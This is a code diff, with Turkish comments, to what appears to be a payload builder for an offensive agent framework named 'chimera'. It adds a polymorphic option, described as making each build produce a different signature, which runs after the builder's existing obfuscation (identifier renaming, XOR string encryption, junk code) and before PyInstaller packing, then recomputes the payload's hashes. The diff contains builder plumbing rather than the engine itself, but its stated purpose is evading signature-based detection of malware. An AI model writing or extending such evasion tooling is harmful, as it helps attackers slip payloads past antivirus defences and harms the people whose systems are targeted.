@@ -46,6 +46,21 @@ except ImportError:
     except ImportError:
         _OBFUSCATOR_AVAILABLE = False
 
+# Polimorfik engine'i içe aktarmaya çalış
+try:
+    from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic, print_polymorphic_report
+    _POLYMORPHIC_AVAILABLE = True
+except ImportError:
+    try:
+        _builder_dir = os.path.dirname(os.path.abspath(__file__))
+        _project_root = os.path.dirname(_builder_dir)
+        if _project_root not in sys.path:
+            sys.path.insert(0, _project_root)
+        from build.chimera_polymorphic import polymorphic_wrap as _run_polymorphic, print_polymorphic_report
+        _POLYMORPHIC_AVAILABLE = True
+    except ImportError:
+        _POLYMORPHIC_AVAILABLE = False
+
 
 
 # ============================================================
@@ -174,6 +189,7 @@ def build_payload(
     agent_source_path: str = None,
     strip_comments: bool = False,
     obfuscate: bool = False,
+    polymorphic: bool = False,
     build_bin: bool = False,
     quiet: bool = False
 ) -> dict:
@@ -192,6 +208,7 @@ def build_payload(
         agent_source_path:  Agent kaynak dosyası yolu (None ise otomatik bulur).
         strip_comments:     Yorum satırlarını kaldır.
         obfuscate:          AST rename + XOR string encrypt + junk code uygula.
+        polymorphic:        Polimorfik engine uygula (her build farklı imza üretir).
         build_bin:          PyInstaller kullanarak çalıştırılabilir ikili (binary) dosyasına dönüştür.
         quiet:              Ekrana çıktı basma.
 
@@ -210,7 +227,8 @@ def build_payload(
         "output_path": None,
         "error": None,
         "stats": {},
-        "obfuscation_stats": {}
+        "obfuscation_stats": {},
+        "polymorphic_mutations": []
     }
 
     # --- Doğrulama ---
@@ -376,6 +394,30 @@ def build_payload(
                 if not quiet:
                     print(f"[!] Obfuscation başarısız: {obf_result['error']}")
 
+    # --- Polimorfik Engine (opsiyonel) ---
+    if polymorphic:
+        if not _POLYMORPHIC_AVAILABLE:
+            if not quiet:
+                print("[!] UYARI: chimera_polymorphic yüklenemedi, polimorfik dönüşüm atlandı.")
+        else:
+            if not quiet:
+                print("[*] Polimorfik dönüşüm uygulanıyor...")
+            poly_result = _run_polymorphic(agent_code)
+            if poly_result["success"]:
+                agent_code = poly_result["code"]
+                result["code"] = agent_code
+                result["polymorphic_mutations"] = poly_result["mutations"]
+                # Hash ve boyut istatistiklerini güncelle
+                final_enc = agent_code.encode("utf-8")
+                result["stats"]["final_size"]  = len(final_enc)
+                result["stats"]["line_count"]  = agent_code.count("\n") + 1
+                result["stats"]["md5"]         = hashlib.md5(final_enc).hexdigest()
+                result["stats"]["sha256"]      = hashlib.sha256(final_enc).hexdigest()
+                result["stats"]["polymorphic"] = True
+            else:
+                if not quiet:
+                    print(f"[!] Polimorfik dönüşüm başarısız: {poly_result['error']}")
+
     # --- Dosyaya yaz ve İkili Derleme (Build) ---
     if build_bin and not output_path:
         result["error"] = "[!] Derleme işlemi için OUTPUT belirtilmek zorundadır."
@@ -540,6 +582,10 @@ def print_build_report(result: dict):
     bin_str = "✅ Evet" if bin_flag else "Hayır"
     print(f"  ║  ├─ İkili Derleme   : {bin_str:<35}║")
 
+    poly_flag = stats.get('polymorphic', False)
+    poly_str = "✅ Evet" if poly_flag else "Hayır"
+    print(f"  ║  ├─ Polimorfik      : {poly_str:<35}║")
+
     print(f"  ╠{border}╣")
     print(f"  ║  🔐 Hash Değerleri                                      ║")
     print(f"  ║  ├─ MD5    : {stats['md5']:<44}║")
@@ -615,6 +661,10 @@ def main():
         help="AST rename + XOR string şifreleme + junk code uygula."
     )
     parser.add_argument(
+        "--polymorphic", action="store_true",
+        help="Polimorfik engine uygula (her build farklı imza üretir)."
+    )
+    parser.add_argument(
         "--build-bin", action="store_true",
         help="PyInstaller kullanarak çalıştırılabilir ikili dosyaya (binary) dönüştür."
     )
@@ -634,6 +684,7 @@ def main():
         agent_source_path=args.agent_source,
         strip_comments=args.strip_comments,
         obfuscate=args.obfuscate,
+        polymorphic=args.polymorphic,
         build_bin=args.build_bin,
         quiet=args.quiet,
     )
